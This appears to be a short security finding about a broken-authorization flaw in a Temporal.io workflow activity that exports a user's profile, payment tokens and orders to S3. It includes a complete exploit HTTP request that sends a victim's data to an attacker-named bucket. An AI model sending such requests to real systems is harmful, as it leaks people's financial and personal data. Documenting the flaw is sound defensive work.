diagnosis: The Temporal.io worker activity accepts targetUserId and destinationBucket from workflow input parameters and extracts the target user's profile, payment tokens, and orders, writing them to an S3 bucket. Because the activity assumes authorization was already enforced and executes solely based on targetUserId, any workflow started with unvalidated user input exposes full financial and personal data.
exploit_request:
POST /api/workflows/export-user HTTP/1.1
Host: orchestrator.platform.io
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"targetUserId": "usr_victim_billionaire_991", "destinationBucket": "attacker-public-bucket"}
